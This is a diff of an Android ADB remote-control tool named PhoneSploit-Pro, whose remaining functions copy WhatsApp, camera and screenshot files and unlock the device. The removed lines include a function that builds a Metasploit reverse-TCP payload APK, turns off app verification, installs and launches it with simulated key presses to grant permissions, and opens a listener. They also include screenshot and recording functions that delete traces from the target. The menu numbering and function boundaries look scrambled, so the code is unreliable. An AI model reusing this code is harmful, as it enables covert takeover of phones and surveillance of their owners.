@@ -150,7 +150,7 @@ def get_shell():
 def get_screenshot():
     global screenshot_location
     # Getting a temporary file name to store time specific results
-    instant = datetime.datetime.now()
+    instant = datetime.now()
     file_name = f"screenshot-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.png"
     os.system(f"adb shell screencap -p /sdcard/{file_name}")
     if screenshot_location == "":
@@ -189,7 +189,7 @@ def get_screenshot():
 def screenrecord():
     global screenrecord_location
     # Getting a temporary file name to store time specific results
-    instant = datetime.datetime.now()
+    instant = datetime.now()
     file_name = f"vid-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.mp4"
 
     duration = input(
@@ -228,107 +228,6 @@ def screenrecord():
             if choice == "y" or choice == "":
                 os.system(f"{opener} {screenrecord_location}/{file_name}")
     print("\n")
-
-
-def pull_file():
-    global pull_location
-    print(
-        f"\n{color.CYAN}Enter file path           {color.YELLOW}Example : /sdcard/Download/sample.jpg{color.WHITE}"
-    )
-    location = input("\n> /sdcard/")
-    # Checking if specified file or folder exists in Android
-    if os.system(f"adb shell test -e /sdcard/{location}") == 0:
-        pass
-    else:
-        print(
-            f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}"
-        )
-        return
-
-    if pull_location == "":
-        print(
-            f"\n{color.YELLOW}Enter location to save all files, Press 'Enter' for default{color.WHITE}"
-        )
-        pull_location = input("> ")
-    if pull_location == "":
-        pull_location = "Downloaded-Files"
-        print(
-            f"\n{color.PURPLE}Saving file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
-        )
-    else:
-        print(f"\n{color.PURPLE}Saving file to {pull_location}\n{color.WHITE}")
-    os.system(f"adb pull /sdcard/{location} {pull_location}")
-
-    # Asking to open file
-    choice = input(
-        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
-    ).lower()
-
-    # updating location = file_name if it existed inside a folder
-    # Example : sdcard/DCIM/longtime.jpg -> longtime.jpg
-    file_path = location.split("/")
-    location = file_path[len(file_path) - 1]
-
-    # processing request
-    if choice == "y" or choice == "":
-        os.system(f"{opener} {pull_location}/{location}")
-
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
-            choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
-                os.system(f"{opener} {pull_location}/{location}")
-
-
-def push_file():
-    location = input(f"\n{color.CYAN}Enter file path in computer{color.WHITE} > ")
-
-    if location == "":
-        print(
-            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
-        )
-        return
-    else:
-        if operating_system == "Windows":
-            file_status = int(
-                os.popen(f"if exist {location} (echo 0) ELSE (echo 1)").read()
-            )
-        else:
-            file_status = os.system(f"test -e {location}")
-        if file_status == 0:
-            pass
-        else:
-            print(
-                f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}"
-            )
-            return
-        destination = input(
-            f"\n{color.CYAN}Enter destination path              {color.YELLOW}Example : /sdcard/Documents{color.WHITE}\n> /sdcard/"
-        )
-        os.system("adb push " + location + " /sdcard/" + destination)
-
-# def install_app():
-    file_location = input(f"\n{color.CYAN}Enter APK path in computer{color.WHITE} > ")
-
-    if file_location == "":
-        print(
-            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
-        )
-        return
-    else:
-        if file_location[len(file_location) - 1] == " ":
-            file_location = file_location.removesuffix(" ")
-        file_location = file_location.replace("'", "")
-        file_location = file_location.replace('"', "")
-        if not os.path.isfile(file_location):
-            print(
-                f"{color.RED}\n[Error]{color.GREEN} This file does not exist {color.GREEN}"
-            )
-            return
-        else:
-            file_location = "'" + file_location + "'"
-            os.system("adb install " + file_location)
-        print("\n")
 
 
 def uninstall_app():
@@ -521,107 +420,10 @@ def reboot(key):
     print("\n")
 
 
-# def list_files():
+def list_files():
     print("\n")
     os.system("adb shell ls -a /sdcard/")
     print("\n")
-
-
-def get_ip_address():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    return s.getsockname()[0]
-
-
-def instructions():
-    """Prints instructions for Metasploit and returns user's choice"""
-    os.system(clear)
-    print(banner.instructions_banner + banner.instruction)
-    choice = input("> ")
-    if choice == "":
-        return True
-    else:
-        return False
-
-
-def hack():
-    continue_hack = instructions()
-    if continue_hack:
-        os.system(clear)
-        ip = get_ip_address()  # getting IP Address to create payload
-        lport = "4444"
-        print(
-            f"\n{color.CYAN}Using LHOST : {color.WHITE}{ip}{color.CYAN} & LPORT : {color.WHITE}{lport}{color.CYAN} to create payload\n{color.WHITE}"
-        )
-
-        choice = input(
-            f"\n{color.YELLOW}Press 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > {color.WHITE}"
-        ).lower()
-
-        if choice == "m":
-            ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
-            lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
-        elif choice != "":
-            while choice != "m" and choice != "":
-                choice = input(
-                    f"\n{color.RED}Invalid selection! , Press 'Enter' OR M > {color.WHITE}"
-                ).lower()
-                if choice == "m":
-                    ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
-                    lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
-
-        print(banner.hacking_banner)
-        print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
-        # creating payload
-        os.system(
-            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk"
-        )
-        print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
-        os.system("adb shell input keyevent 3")  # Going on Home Screen
-
-        # Disabling App Verification
-        os.system("adb shell settings put global package_verifier_enable 0")
-        os.system("adb shell settings put global verifier_verify_adb_installs 0")
-
-        # installing apk to device
-        if operating_system == "Windows":
-            # (used 'start /b' to execute command in background)
-            # os.system("start /b adb install -r test.apk")
-            os.system("adb install -r test.apk")
-        else:
-            # (used ' &' to execute command in background)
-            # os.system("adb install -r test.apk &")
-            os.system("adb install -r test.apk")
-        # time.sleep(5)  # waiting for apk to be installed
-
-        # Keyboard input to accept app install
-        print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
-        package_name = "com.metasploit.stage"  # payload package name
-        os.system("adb shell monkey -p " + package_name + " 1")
-        time.sleep(3)  # waiting for app to launch
-
-        # Keyboard input to accept app permissions
-        print(
-            f"\n{color.CYAN}Sending keycodes to accept the app permissions\n{color.WHITE}"
-        )
-        os.system("adb shell input keyevent 22")
-        os.system("adb shell input keyevent 22")
-        os.system("adb shell input keyevent 66")
-
-        # Launching Metasploit
-        print(
-            f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}"
-        )
-        os.system(
-            f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'"
-        )
-
-        # Re-Enabling App Verification (Restoring Device to Previous State)
-        os.system("adb shell settings put global package_verifier_enable 1")
-        os.system("adb shell settings put global verifier_verify_adb_installs 1")
-
-    else:
-        print("\nGoing Back to Main Menu\n")
 
 
 def copy_whatsapp():
@@ -720,168 +522,6 @@ def copy_camera():
     print("\n")
 
 
-def anonymous_screenshot():
-    global screenshot_location
-    # Getting a temporary file name to store time specific results
-    instant = datetime.datetime.now()
-    file_name = f"screenshot-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.png"
-    os.system(f"adb shell screencap -p /sdcard/{file_name}")
-    if screenshot_location == "":
-        print(
-            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}"
-        )
-        screenshot_location = input("> ")
-    if screenshot_location == "":
-        screenshot_location = "Downloaded-Files"
-        print(
-            f"\n{color.PURPLE}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}"
-        )
-    else:
-        print(
-            f"\n{color.PURPLE}Saving screenshot to {screenshot_location}\n{color.WHITE}"
-        )
-
-    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")
-
-    print(f"\n{color.YELLOW}Deleting screenshot from Target device\n{color.WHITE}")
-    os.system(f"adb shell rm /sdcard/{file_name}")
-
-    # Asking to open file
-    choice = input(
-        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
-    ).lower()
-    if choice == "y" or choice == "":
-        os.system(f"{opener} {screenshot_location}/{file_name}")
-
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
-            choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
-                os.system(f"{opener} {screenshot_location}/{file_name}")
-
-    print("\n")
-
-
-def anonymous_screenrecord():
-    global screenrecord_location
-    # Getting a temporary file name to store time specific results
-    instant = datetime.datetime.now()
-    file_name = f"vid-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.mp4"
-
-    duration = input(
-        f"\n{color.CYAN}Enter the recording duration (in seconds) > {color.WHITE}"
-    )
-    print(f"\n{color.YELLOW}Starting Screen Recording...\n{color.WHITE}")
-    os.system(
-        f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}"
-    )
-
-    if screenrecord_location == "":
-        print(
-            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}"
-        )
-        screenrecord_location = input("> ")
-    if screenrecord_location == "":
-        screenrecord_location = "Downloaded-Files"
-        print(
-            f"\n{color.PURPLE}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}"
-        )
-    else:
-        print(f"\n{color.PURPLE}Saving video to {screenrecord_location}\n{color.WHITE}")
-
-    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")
-
-    print(f"\n{color.YELLOW}Deleting video from Target device\n{color.WHITE}")
-    os.system(f"adb shell rm /sdcard/{file_name}")
-    # Asking to open file
-    choice = input(
-        f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
-    ).lower()
-    if choice == "y" or choice == "":
-        os.system(f"{opener} {screenrecord_location}/{file_name}")
-
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
-            choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
-                os.system(f"{opener} {screenrecord_location}/{file_name}")
-    print("\n")
-
-
-# def use_keycode():
-    keycodes = True
-    os.system(clear)
-    print(banner.keycode_menu)
-    while keycodes:
-        print(f"\n {color.CYAN}99 : Clear Screen                0 : Main Menu")
-        keycode_option = input(
-            f"{color.RED}\n[KEYCODE] {color.WHITE}Enter selection > "
-        ).lower()
-
-        match keycode_option:
-            case "0":
-                keycodes = False
-                display_menu()
-            case "99":
-                os.system(clear)
-                print(banner.keycode_menu)
-            case "1":
-                text = input(f"\n{color.CYAN}Enter text > {color.WHITE}")
-                os.system(f'adb shell input text "{text}"')
-                print(f'{color.YELLOW}\nEntered {color.WHITE}"{text}"')
-            case "2":
-                os.system("adb shell input keyevent 3")
-                print(f"{color.YELLOW}\nPressed Home Button{color.WHITE}")
-            case "3":
-                os.system("adb shell input keyevent 4")
-                print(f"{color.YELLOW}\nPressed Back Button{color.WHITE}")
-            case "4":
-                os.system("adb shell input keyevent 187")
-                print(f"{color.YELLOW}\nPressed Recent Apps Button{color.WHITE}")
-            case "5":
-                os.system("adb shell input keyevent 26")
-                print(f"{color.YELLOW}\nPressed Power Key{color.WHITE}")
-            case "6":
-                os.system("adb shell input keyevent 19")
-                print(f"{color.YELLOW}\nPressed DPAD Up{color.WHITE}")
-            case "7":
-                os.system("adb shell input keyevent 20")
-                print(f"{color.YELLOW}\nPressed DPAD Down{color.WHITE}")
-            case "8":
-                os.system("adb shell input keyevent 21")
-                print(f"{color.YELLOW}\nPressed DPAD Left{color.WHITE}")
-            case "9":
-                os.system("adb shell input keyevent 22")
-                print(f"{color.YELLOW}\nPressed DPAD Right{color.WHITE}")
-            case "10":
-                os.system("adb shell input keyevent 67")
-                print(f"{color.YELLOW}\nPressed Delete/Backspace{color.WHITE}")
-            case "11":
-                os.system("adb shell input keyevent 66")
-                print(f"{color.YELLOW}\nPressed Enter{color.WHITE}")
-            case "12":
-                os.system("adb shell input keyevent 24")
-                print(f"{color.YELLOW}\nPressed Volume Up{color.WHITE}")
-            case "13":
-                os.system("adb shell input keyevent 25")
-                print(f"{color.YELLOW}\nPressed Volume Down{color.WHITE}")
-            case "14":
-                os.system("adb shell input keyevent 126")
-                print(f"{color.YELLOW}\nPressed Media Play{color.WHITE}")
-            case "15":
-                os.system("adb shell input keyevent 127")
-                print(f"{color.YELLOW}\nPressed Media Pause{color.WHITE}")
-            case "16":
-                os.system("adb shell input keyevent 61")
-                print(f"{color.YELLOW}\nPressed Tab Key{color.WHITE}")
-            case "17":
-                os.system("adb shell input keyevent 111")
-                print(f"{color.YELLOW}\nPressed Esc Key{color.WHITE}")
-
-            case other:
-                print("\nInvalid selection!\n")
-
-
 def open_link():
     print(
         f"\n{color.YELLOW}Enter URL              {color.CYAN}Example : https://web.radav.org/ {color.WHITE}"
@@ -941,9 +581,6 @@ def open_photo():
             f'adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/{file_name}" -t image/jpeg'
         )  # -n com.android.chrome/com.google.android.apps.chrome.Main
         print("\n")
-
-
-
 
 
 def open_video():
@@ -1031,29 +668,6 @@ def battery_info():
     )
 
 
-def send_sms():
-    print(
-        f"\n{color.RED}[Warning] {color.CYAN}This feature is currently in BETA, Tested on Android 12 only{color.WHITE}"
-    )
-
-    number = input(
-        f"{color.YELLOW}\nEnter Phone number with country code{color.WHITE} (e.g. +91XXXXXXXXXX) > "
-    )
-
-    if number == "":
-        print(
-            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
-        )
-        return
-    else:
-        message = input(f"{color.YELLOW}\nEnter your message {color.WHITE}> ")
-
-        print(f"{color.CYAN}\nSending SMS to {number} ...{color.WHITE}")
-        os.system(
-            f'adb shell service call isms 5 i32 0 s16 "com.android.mms.service" s16 "null" s16 "{number}" s16 "null" s16 "{message}" s16 "null" s16 "null" s16 "null" s16 "null"'
-        )
-
-
 def unlock_device():
     password = input(
         f"{color.YELLOW}\nEnter password or Press 'Enter' for blank{color.WHITE} > "
@@ -1130,6 +744,9 @@ def power_off():
     os.system(f"adb shell reboot -p")
     print("\n")
 
+def stop_adb():
+    os.system("adb kill-server")
+    print("\nStopped ADB Server")
 
 def create_report(users):
     with open("Report.txt", "a") as log_file:
@@ -1188,52 +805,40 @@ def main():
         case "6":
             screenrecord()
         case "7":
-            pull_file()
-        case "8":
-            push_file()
-        case "9":
             launch_app()
-        case "10":
-            anonymous_screenrecord()
-        case "11":
+        case "8":
             open_link()
-        case "12":
+        case "9":
             open_photo()
-        case "13":
-            open_video()
-        case "14":
-            get_device_info()
-        case "15":
-            battery_info()
-        case "16":
-            reboot("system")
-        case "17":
-            reboot("advanced")
-        case "18":
-            lock_device()
-        case "19":
-            uninstall_app()
-        case "20":
-            list_apps()
         case "21":
-            get_shell()
+            open_video()
+        case "12":
+            get_device_info()
+        case "13":
+            battery_info()
+        case "14":
+            reboot("system")
+        case "15":
+            reboot("advanced")
+        case "16":
+            lock_device()
         case "22":
-            list_files()
+            uninstall_app()
         case "23":
+            list_apps()
+        case "18":
+            list_files()
+        case "19":
             copy_whatsapp()
-        case "24":
+        case "20":
             copy_screenshots()
-        case "25":
+        case "17":
             copy_camera()
-        case "26":
-            anonymous_screenshot()
-        case "27":
-            extract_apk()
-        case "28":
+        case "11":
             stop_adb()
-        case "29":
+        case "10":
             power_off()
-        case "30":
+        case "24":
             report()
         case other:
             print("\nInvalid selection!\n")
